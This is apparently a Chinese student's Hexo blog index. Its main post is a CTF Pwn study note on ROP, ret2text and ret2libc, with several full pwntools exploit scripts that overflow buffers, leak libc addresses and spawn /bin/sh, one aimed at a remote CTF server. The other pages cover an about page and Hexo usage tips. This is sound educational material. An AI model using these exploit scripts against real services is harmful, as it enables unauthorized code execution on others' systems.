{"meta":{"title":"は永遠に不滅である","subtitle":"击碎你沉睡的灵魂！","description":"For Study","author":"4riH04X","url":"http://example.com","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"11-02","excerpt":""},{"title":"About Me","text":"0.论前世，不问来者热爱学习的小菜鸡、又菜又爱玩的小菜鸡、一窍不通但一腔热血的小菜鸡…… 一句话送给此时的我和此时正在看的你： “种一棵树最好的时间是十年前，其次是现在！” 1.个人简介船带网安学子一枚，手贱高考还填报了法学专业，因此笨人是“高贵”的网安法双学位学生。 见笑了，没学过法律的小菜鸡。 喜欢数据分析，二进制安全。另外引师傅们的自我介绍：“自学二进制漏洞，是个 pwn 究极菜鸡” 但足够热爱，足矣。又想起两句话： “有人问我，你害怕死亡吗？” “答曰：若立足年成天地之魄，死又何妨” 当坚持热爱每一天的生活，当把每分每秒塞满时，这是极其幸福的。 2.ID解读4riH04X，疯癫之意，希望能不顾牲命，H04X即是HOAX疯狂、疯癫。 “即是我认定的巅峰，无顾艰辛，亦为此疯癫，纵千年无名” 希望能以此 ID 自嘲并鼓励自己不顾他人眼光，自我陶醉吧！ ~“Past lives couldn’t ever hold me” ~”Don’t wake me, I’m not dreamin’” 3.未来展望借此博客的开辟，记录一下自己的学习体会和个人对一些知识浅薄的理解。更多的希望自己借此博客激励自己， “仰天大笑出门去，我辈岂是蓬蒿人！”","path":"about/index.html","date":"11-02","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"11-02","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"11-02","excerpt":""},{"title":"friends","text":"友人帐这些人都是巨佬，浅浅挂一下希望别骂我，，， tld 糊涂涂の博客","path":"friends/index.html","date":"11-05","excerpt":""},{"title":"links","text":"0.说明这里存放了一些实用的网站！！！持续更新，可以给我留言","path":"links/index.html","date":"11-05","excerpt":""}],"posts":[{"title":"Pwn复习-初级ROP","text":"一.ROP编程介绍随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 1.程序存在溢出，并且可以控制返回地址。 2.可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 3.如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。 二.ret2text1.原理ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 注： ret2text即控制返回地址指向程序本身已有的的代码(.text)并执行 2.x64和x86函数调用方式不同导致ret2text布栈不同2.1函数调用约定_cdecl: c&#x2F;c++默认方式，参数从右向左入栈，主调函数负责栈平衡。 _stdcall: Windows API方式，参数从右向左入栈，被调函数负责栈平衡。 _fastcall: 快速调用方式。即将参数优先从寄存器传入（ecx和edx），剩下的参数从右向左入栈。由于栈位于内存区域，而寄存器位于cpu内，存取快于内存。 这里讲述默认的gcc调用约定_cdecl的一些特点。 x86 使用栈传递参数 使用eax存放返回值 x64 前六个参数依次存放于rdi，rsi，rdx，rcx，r8，r9中 多余的参数存放于栈中 3.解法举例 3.1x86题解方法对于函数传参的函数，其栈格式为： 故而我们需要利用溢出覆盖返回地址进入func函数内部，再将参数一指向“&#x2F;bin&#x2F;sh”的储存地址即可。其中要注意的是r处需要我们进行垃圾数据的填充。 现在利用gdb查找func函数地址和sh存放地址（具体偏移量由ida查看不再详细讲解） 注意这种x86是要进入func函数，然后把参数一覆盖成bin&#x2F;sh,因此有三个参数，payload &#x3D; padding*b’a’ + p32(ret_addr) + p32(0) + p32(sh_addr) 书写payload： 12345678910111213141516171819202122232425`from pwn import * context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;) file = &#x27;./ret2text_func2_x86&#x27; io = process(file)elf = ELF(file)rop = ROP(file) sh_addr = 0x804c018ret_addr = elf.symbols[&#x27;func&#x27;]padding = 0x14 payload = padding*b&#x27;a&#x27; + p32(ret_addr) + p32(0) + p32(sh_addr) dem = b&#x27;inputs:&#x27;io.sendlineafter(dem,payload)io.interactive()` 成功 3.2x64解题方法对x64的参数，大部分情况下，前六个参数储存在寄存器内，无法直接使用简单的栈溢出修改寄存器内容，这时候我们需要解除ROPgadget工具进行辅助。 ROP(Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到可执行文件中已有的片段代码中执行我们选择的代码段。 知道了ROP工具的功能，我们需要做的是 修改rdi的值（可使用代码pop rdi ; ret） 在栈中放入‘bin&#x2F;sh’经由pop提交给rdi 进入func函数内调用system函数 利用gdb查找func函数地址和sh存放地址（具体偏移量由ida查看不再详细讲解）： 利用ROPgadget查找需要的代码行–pop rdi ; ret 1ROPgadget --binary ret2text_func2_x64 --only &#x27;pop|ret&#x27; payload &#x3D; padding*b’a’ + p64(pop_rdi_ret) + p64(sh_addr)+ p64(ret_addr) #64位三步走原则 构造payload： 1234567891011121314151617181920212223242526`from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#context(arch=&#x27;arm64&#x27;,os=&#x27;linux&#x27;)#打开路径file = &#x27;./ret2text_func2_x64&#x27; io = process(file) elf = ELF(file) rop = ROP(file) #调试gdb.attach(io)pause()sh_addr = 0x404028 ret_addr = elf.symbols[&#x27;func&#x27;] #这个可以自己找，也可以调用函数帮你找 pop_rdi_ret = 0x40121b #这个用gadget就行 padding = 0x10payload = padding*b&#x27;a&#x27; + p64(pop_rdi_ret) + p64(sh_addr)+ p64(ret_addr) #64位三步走原则 dem = b&#x27;inputs:&#x27; io.sendlineafter(dem,payload) io.interactive()` 运行成功pwn掉 3.3x86举例其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。 首先，查看一下程序的保护机制 123456➜ ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现 1234567891011121314151617181920212223.text:080485FD secure proc near.text:080485FD.text:080485FD input = dword ptr -10h.text:080485FD secretcode = dword ptr -0Ch.text:080485FD.text:080485FD push ebp.text:080485FE mov ebp, esp.text:08048600 sub esp, 28h.text:08048603 mov dword ptr [esp], 0 ; timer.text:0804860A call _time.text:0804860F mov [esp], eax ; seed.text:08048612 call _srand.text:08048617 call _rand.text:0804861C mov [ebp+secretcode], eax.text:0804861F lea eax, [ebp+input].text:08048622 mov [esp+4], eax.text:08048626 mov dword ptr [esp], offset unk_8048760.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp+input].text:08048635 cmp eax, [ebp+secretcode].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system 在 secure 函数又发现了存在调用 system(“&#x2F;bin&#x2F;sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。 下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。 123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets 可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下 gef➤ b *0x080486AE Breakpoint 1 at 0x80486ae: file ret2text.c, line 24. gef➤ r There is something amazing here, do you know anything? Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf);──────────────────────────────────────────────────────────────── 12345678910──────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; 可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 esp+0x1c，因此，我们可以推断 s 的地址为 0xffffcd5cs 相对于 ebp 的偏移为 0x6cs 相对于返回地址的偏移为 0x6c+4最后的 payload 如下： 这种x86直接就是主函数中有输入函数，具体题目中二者区别不大，有时都能打通 1234567##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;A&#x27; * (0x6c+4) + p32(target))sh.interactive() 3.3x86题解补充疑问（为什么加p32(0)）- 栈对齐对于本题的函数传参，我们的栈帧构造初步想法如图 ebp ‘aaaa’ r return to func 参数一 “&#x2F;bin&#x2F;sh” 输入适量垃圾填充 padding * b ‘a’ 覆盖返回地址指向func函数 p32(ret_addr) 参数”&#x2F;bin&#x2F;sh”地址 则payload &#x3D; padding*b’a’ + p32(ret_addr) + p32(sh_addr) 然而这样的脚本在攻击时会出错。原因在于： 正常的函数调用call来达到push eip；jmp的作用，经过初步payload构造的攻击如下图所示，是通过覆盖return达到jmp的作用的，并没有像call一样push eip到栈中。 故而ret执行后，ebp后为我们输入的参数而非eip原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用ret2text覆盖pwn题时候，需要自行加入一行栈帧的填充。 三.ret2libcI.灵魂五问1.没有写 system 就一定没有 system？答：有 system， 在libc里面，别人写好的 2.怎找到 libc 基地址 ？答：使用输出 libc 其中的函数地址，从而计算基地址 3.怎么输出 libc 其中的函数地址？答：模仿程序如何找 libc 其中的函数地址的方式去寻找。 4.怎把GOT表项内容打印出来。答：利用输出函数泄露got表内容。 5.怎么找到 system binsh 地址答：利用偏移计算 常用会用到的指令： 123`readelf -a b|less # ROPgadget --binary 文件名 --only &quot;pop|ret&quot; #找特定gadget#寄存器ldd 文件名 #看动态链接 II.自己的理解1.我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点 ​ system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集​ 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 2.那么如何得到 libc 中的某个函数的地址呢？ ​ 我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readmehttps://github.com/lieanu/LibcSearcher此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。 这里我们泄露 libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下1.泄露 libc_start_main 地址2.获取 libc 版本3.获取 system 地址与 &#x2F;bin&#x2F;sh 的地址4.再次执行源程序5.触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)** III.解法举例1)x64:0.调用约定64位系统中使用寄存器传递参数：rdi、rsi、rdx、rcx、r8、r9（1-6个参数）参考：http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/要构造write(1,buf2,20)，需要控制3个参数：rdi、rsi、rdx，第3个参数代表输出的size，如果没有rdx的gadget可以暂时不管，输出多少无所谓，在下面我们构造payload的时候，我们不写第3个参数 0.1举例1234567891011当我们覆盖到rbp后回忆函数调用的流程，把rbp的下一个地址开始原来存的东西覆盖成我们想要的地址第一次： 第二次回到main----rbp(esp0-16)(ida-&gt;s)：覆盖完 ----同理----esp0-8(ida-&gt;r): &quot;pop_rdi_rsi_rdxret&quot; ----&quot;pop_rdi_ret&quot;----esp0: &quot;rdi&quot; &quot;1&quot; ----&quot;/bin/sh_addr&quot;----esp0+8: &#x27;pop_rsi_r15_ret&#x27; ----&quot;system_addr&quot; ----esp+16:&quot;leak_func_got&quot; 这次布栈就像ret_text中的system函数一样来布----esp+24:&quot;r15&quot; 8位可以是&quot;deadbeef&quot;----esp+32:&quot;泄露GOT真正地址的函数如write_sym&quot;----esp+40:&#x27;返回地址&#x27; 1.padding首先我们需要确定padding，在哪里溢出，把这个空填满，溢出到rbp完—-padding和以前一样，看哪里gets或者read函数，这里其实就是scanf—-可以通过ida或者动态调试得到—-参考以前的题目，像buuctf前几道rip,level.. 2.第一次溢出，目标获得的libc某个函数的真实地址2.1第一次溢出比如：以下是write函数为例 1234567891011121314151617leak_func_name =&#x27;write&#x27; leak_func_got = elf.got[leak_func_name] # leak_func_got泄露的got表 去ida上看write的地址 #got.plt:0000000000404018 48 unk_404018 db 48h ; H OFF64 EXTDEF [extern,404048]=404048 (write)#leak_func_got = 404018return_addr = elf.symbols[&#x27;dofunc&#x27;]write_sym = elf.symbols[&#x27;write&#x27;]pop_rdi_ret = 0x4011fb #用ROPgadget查的pop_rsi_r15_ret = 0x4011f9#同上payload = b&#x27;a&#x27;* padding + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(leak_func_got) + p64(0xdeadbeef)# 产生溢出的字符串 pop_rdi_ret rdi存的值 pop_rsi_r15_ret leak_func_got泄露的got表 r15# 第一个参数 第二个参数（rdx第三个参数没有先不管）# 第一步 第2步rdi 【 第三步 plt表 】 第四步got表 第五步填deedbeef payload = payload + p64(write_sym) + p64(return_addr) # 第六步write偏移地址 第七步返回地址（进入第二次溢出的返回地址） delimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload) 2.2收获这个函数的真实地址12345678910gets_addr=u64(p.recv()[:8]) #p.recv()[:8]: 这个部分是将从管道中接收到的数据的前 8 个字节切片出来。u64换成无符号整数#puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) # 接收puts的真实地址#p.recv(6): 从管道中接收 6 个字节的数据。.ljust(8, b&#x27;\\x00&#x27;): 对接收到的 6 个字节数据进行填充，#使其总长度为 8 字节，填充内容是 0x00 字节。以后可以不是6位#puts_addr=u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;)) #得到 puts 函数 的地址;#p.recvuntil(&#x27;\\n&#x27;): 从管道中接收数据，直到遇到换行符 \\n 为止。这个函数会将接收到的数据包括换行符在内全部返回。#[:-1]: 使用切片操作，去掉接收到的数据中的最后一个字符，即换行符 \\n。#.ljust(8, &#x27;\\0&#x27;): 将剩余的数据（不包括换行符）进行填充，使其总长度为 8 字节，填充内容是空字符 \\0。 3.第二次溢出构造payload23.1获得基地址12libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#本地调试，可用ldd查libc_base=gets_addr-libc.symbols[&quot;gets&quot;] # 得到基地址 3.2算system和binsh地址12system_addr=libc_base+libc.symbols[&quot;system&quot;]bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;)) 12345#远程版本libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到基地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址 3.3获取shell1234567payload2=offset*b&quot;B&quot;+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) #64位三步走，和rettext一样一般会接收到程序本身的字符串后，再发送payloaddelimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload2)pause()io.interactive() 2）x86:最大区别是参数存放不用寄存器0.使用条件ret2libc的使用条件泄漏Libc函数地址的条件：程序有输出函数，如puts、printf、write；要输出函数的目的是要泄漏地址实现：设置好输出函数的参数为某函数GOT表地址；GOT表中保存已调用过的函数的真实地址 1.核心泄漏ret2libc_32任意一个函数的位置获取libc的版本根据偏移获取shell和sh的位置执行程序获取shell 2.内存分布，举例—esp— …— buf—ebp 栈帧---write@plt 返回地址—main @@@@@’预留返回地址！！！！！！！！‘@@@@— 1 write函数参数一(1)—write_got地址 write函数参数二(write_got地址)— 4 write函数参数三(写4字节)32位—高地址，栈底 3.第一次溢出，目标：找到一个函数地址第一个以write为例子： 1234567write_plt=e.plt[&quot;write&quot;]write_got=e.got[&quot;write&quot;]main_addr=e.symbols[&quot;main&quot;]# char[88] ebp write函数参数一(1) write函数参数二(write_got地址)payload=0x88*b&#x27;a&#x27;+ p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1)+p32(write_got)+p32(4)# write函数返回地址 (返回到main函数) write函数参数三(写4字节)32位# 0x88*b&#x27;a&#x27;+ p32(0xdeadbeef)其实是char和ebp分开的，可以合起来算 ‘为什么加1，加4’原因：write函数本身有三个参数（1，’hello!’,5）函数说明：write()会把参数buf所指的内存写入count个字节到参数fd所指的文件内。返回值：如果顺利write()会返回实际写入的字节数（len）。当有错误发生时则返回-1，错误代码存入errno中。&#x2F;&#x2F;write(int fd, const void *buf, size_t count);第一个参数 文件描述符fd 1输出，0输入第二个参数 无类型的指针buf，可以存放要写的内容第三个参数 写多少字节数 4字节 下面再举一个：我们决定用泄露_**_libc_strart_main的地址**，来判定libc的版本 12345678#泄露地址puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]print &quot;leak libc_start_main_got addr and return to main again&quot;payload = flat([&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])#调用puts函数后，ret到main函数，用main函数里面的gets来获取libc_start的地址sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)gets_addr = u32(p.recv()) 4.第二次溢出，目标：直接获得shell，像rettext一样4.1获得基地址12libc = ELF(&quot;/lib32/libc.so.6&quot;) #获得libc版本号libc_base = gets_addr - libc.symbols[&quot;gets&quot;] 4.2system和binsh地址12system_addr = libc_base + libc.symbols[&quot;system&quot;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;)) 4.3结束123payload2 = padding*b&quot;A&quot; + p32(system_addr) + p32(0) + p32(bin_sh_addr) #32位两步走p.sendline(payload2)p.interactive() 4.4补充大佬1号心得ROP中对retlibc技术的一些学习心得漏洞利用思路： 1.找到泄露库函数地址的漏洞，获取libc版本（因为一般不会给你libc.so文件）查询libc版本一般有三种方法： 1.libcsearcher库。在编写exp的时候用from LibcSearcher import LibcSearcher导入通过libc.dump(‘system’)可以得到system函数的偏移，libc.dump(‘str_bin_sh’)得到binsh字符串的偏移 2.pwntools自带的Dynelf，需要先构造一个leak函数和一个可以不断触发溢出的漏洞 一个模板： 12345678910def leak(address): #各种预处理 payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot; p.send(payload) #各种处理 data = p.recv(4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak, elf=ELF(&quot;./xxx&quot;)) #初始化DynELF模块 systemAddress = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) #在libc文件中搜索system函数的地址 3.在线查询网站，通过函数的后三位数值查询。https://libc.blukat.me 典型的题目–adworld里的level1（非常典型的retlibc）源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] printf(&quot;What&#x27;s this:%p?\\n&quot;, &amp;buf); return read(0, &amp;buf, 0x100u); //溢出点&#125;exp：from pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#sh = process(&#x27;./level1&#x27;)sh=remote(&#x27;111.198.29.45&#x27;,42536)writeplt= 0x08048370readgot=0x0804A00Cvuln=0x0804847Bpayload = &#x27;a&#x27;*0x8c+p32(writeplt)+p32(vuln)+p32(1)+p32(readgot)+p32(4)#gdb.attach(sh)sh.sendline(payload)readaddr=u32(sh.recv(4))print(hex(readaddr))libc = LibcSearcher(&#x27;read&#x27;, readaddr)libcbase = readaddr - libc.dump(&#x27;read&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload=&#x27;a&#x27;*0x8c+p32(system_addr)+&#x27;a&#x27;*4+p32(binsh_addr)sh.sendline(payload)sh.interactive()sh.close() 笔记:context.log_level&#x3D;’debug’开启调试模式；大佬原文链接：https://blog.csdn.net/qq_41706924/article/details/89607683","path":"Pwn1/","date":"11-08","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"PWN概述","text":"0X01 Pwn简介软件安全：软件安全专注于研究软件的设计和实现的安全研究对象：代码（源码、字节码、汇编等）研究目标：发掘漏洞、利用漏洞、修补漏洞研究技术：逆向工程、漏洞挖掘与利用、漏洞防御技术CTF PWN：软件安全研究的一个缩影 研究对象：可执行文件，主要是ELF文件研究最终目标：夺取Flag软件安全与CTF PWN特点：入门难、进阶难、精通难。 工具：静态分析：IDA Pro动态调试：gdb(with peda or gef)、windbg、ollydbgExploit：pwntools、zio 前置技能：汇编语言：程序执行、函数栈帧、函数调用等编译、链接、装载、执行ELF文件结构Linux系统相关：文件描述符、系统调用、socket编程、shell命令编译原理，操作系统，计算机组成原理 0X02 PWN学习方法学习阶段一：学习套路套路是有限的，假以时日一定会学完的招式针对每种套路都练习1~2道习题学习完所有常见套路，大多数国内比赛的中档题基本都可以随便切 学习阶段二：总结套路，变套路为艺术漏洞利用是一门艺术，难以用套路完全概况，要想切难题不能全靠套路多刷刷国际赛的难题，刷的慢没关系，刷多了自然就会融会贯通多总结思考现有的套路的本质 资源：CTF Writeup Github：https://github.com/ctfs 聚合了各大国际比赛的习题文件以及writeupGoogling:XXX writeup or XXX CTF 百度收录不了github pages0X03 PWN 学习案例 ROP： 1、ROP：现代栈溢出中最基础的利用技术（最简单最基础的套路） 2、Googling 筛选到比较好的题目：r0pbaby 学习writeup，可以参考多篇writeup，根据writeup和学到的内容自己动手调试一下，尽量自己动手重写EXP 重写EXP成功：基本掌握了ROP。 第二章 CTF中漏洞挖掘的方法论：从逆向工程到漏洞挖掘0X01 逆向工程简介 对于PWN来说，逆向工程的主要作用为发掘与分析漏洞 工具： 静态分析工具：IDA pro动态调试工具：gdb、windbg、ollydbg、IDA ProIDA pro的F5大法 0X02 常见漏洞简介 在进行漏洞挖掘之前，必须对常见漏洞非常熟悉！！！ 缓冲区溢出（Buffer Overflow） 堆溢出、栈溢出、bss溢出、data溢出（通常覆盖指针）wellpwn、AliCTF 2016 vss、Hitcon 2015 readable、stkof、zerostorage整数溢出（Integer Overflow） 无符号型与有符号的转换（MMACTF 2016 shadow）整数加减乘除法，如malloc(size*2) (pwnhub.cn calc)整数溢出通常会进一步转换为缓冲区溢出、逻辑漏洞等其他漏洞格式化字符串（Format String） printf(s)、sprintf(s)、fprintf(s)等，可能导致任意地址读写（MMACTF 2016 greeting）可以用来leak（HCTF2016 fheap）释放后使用（Use-After-Free） 释放掉的内存可能会被重新分配，释放后使用会导致重新分配的内存被旧的使用所改写Double free是一种特殊的UAFDefcon 2014 Qualifier shitsco、AliCTF 2016 router、0CTF2016 freenote（double free）、HCTF2016 fheap（double free）逻辑漏洞 访问控制、协议漏洞、多线程竞态条件（fake fuzz）等0X03 漏洞挖掘中的逆向技巧 关键数据结构分析：还原结构体、接口、类等 控制流分析：理清楚程序的执行逻辑，基本要做到从反汇编代码到源码的还原 数据流分析：理清楚数据的流向 CTF漏洞挖掘中的分析策略： 目标文件较小时，通常采用对整个目标文件进行控制流分析，做到整个程序从反汇编代码到接近源码级别的还原，还原的同时查找漏洞目标文件较大时，逆向整个文件所需工作量太大，通常需要额外的关注数据流，并理清楚数据流所经之处的控制流，因为漏洞的触发与数据流离不开关系无论是数据流分析和控制流分析，还原结构体、接口、类都会促进逆向工程控制流分析的主要作用是理清楚程序的逻辑，对于规模较小的目标文件，一般选择理清整个目标文件。 代码以识别为主，不要硬逆。 善用标记，标记结构体、标记变量名、标记变量类型 F5大法好，但是F5不是万能的，当发现F5结果比较诡异时需要在汇编层分析（如mmactf 2016 shadow） 数据流分析 目标文件较大，全盘逆向不现实 追溯用户输入的走向，重点关注对用户输入数据处理的函数可以在不用逆清楚控制流即可找到漏洞，需要一定的技巧性 （plaid CTF 2015 datastore） 原文链接：https://blog.csdn.net/prettyX/article/details/103173220","path":"PWN概述/","date":"11-05","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"我的第一篇博客","text":"​ 总觉得生活里缺少点什么，就以此来填充一下我的枯燥生活吧。","path":"My-first-Boke/","date":"11-02","excerpt":"","tags":[{"name":"About Me","slug":"About-Me","permalink":"http://example.com/tags/About-Me/"}]},{"title":"基于HEXO的写博客tips","text":"1.links怎么放好友链接，看这里 優萌初華 琉璃的医学 & 编程笔记 優萌初華 https://shoka.lostyu.me 優萌初華 琉璃的医学 & 编程笔记 2.code 代码块 使用 markdown-it-prism 进行代码高亮，支持显示行号、行高亮 mark 、命令行提示符 command 、代码块标题。$$基本格式： [language] [title] [url] [link text] [mark] [command]$$ 举个栗子： 行高亮参考链接 mark:1,6-7123456import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println (&quot;Hello&quot; + &quot;world.&quot;); 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1234567891011pwd/usr/home/chris/binls -latotal 2drwxr-xr-x 2 chris chris 11 Jan 10 16:48 .drwxr--r-x 45 chris chris 92 Feb 14 11:10 ..-rwxr-xr-x 1 chris chris 444 Aug 25 2013 backup-rwxr-xr-x 1 chris chris 642 Jan 17 14:42 deploygit add -Agit commit -m &quot;update&quot;git push 3.表情包emoji 绘文字 本功能基于 markdown-it-emoji ，所有标签参考戳此：markdown-it-emoji&#x2F;lib&#x2F;data&#x2F;full.json at master · markdown-it&#x2F;markdown-it-emoji (github.com) 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)123kissing_heart:ring:notes: 如：:kissing_heart: :ring: 4.文字特效本功能基于 markdown-it-ins 、 markdown-it-bracketed-spans 和 markdown-it-attrs 本主题风格颜色通用样式：default、primary、success、info、warning、danger 命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)12345678910111213141516171819202122++ 下划线 ++++ 波浪线 ++&#123;.wavy&#125;++ 着重点 ++&#123;.dot&#125;++ 紫色下划线 ++&#123;.primary&#125;++ 绿色波浪线 ++&#123;.wavy .success&#125;++ 黄色着重点 ++&#123;.dot .warning&#125;~~ 删除线～～~~ 红色删除线～～&#123;.danger&#125;== 荧光高亮 ==[赤橙黄绿青蓝紫]&#123;.rainbow&#125;[红色]&#123;.red&#125;[粉色]&#123;.pink&#125;[橙色]&#123;.orange&#125;[黄色]&#123;.yellow&#125;[绿色]&#123;.green&#125;[靛青]&#123;.aqua&#125;[蓝色]&#123;.blue&#125;[紫色]&#123;.purple&#125;[灰色]&#123;.grey&#125;快捷键 [Ctrl]&#123;.kbd&#125; + [C]&#123;.kbd .red&#125;H~2~029^th^ 这段代码因为自动被 pangu.js 处理了一下，加了几个空格，导致直接复制代码不能正常显示。正确的代码是 ++下划线++ 删除线 &#x3D;&#x3D;荧光高亮&#x3D;&#x3D; ，不能有空格哦。","path":"pagetags/","date":"11-02","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"基于hexo和shoka的博客使用教程","text":"1.hexo官方教程Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Create a new post命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo new &quot;My New Post&quot; More info: Writing Run server命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo server More info: Server Generate static files命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo generate More info: Generating Deploy to remote sites命令行提示符 command:(\"[root@localhost] $\":1,9-10||\"[admin@remotehost] #\":4-6)1hexo deploy More info: Deployment 2.参考博客个人博客搭建完整版笔记 | pitt1997 &#x3D; &#x3D; 真正的大师永远都怀着一颗学徒的心 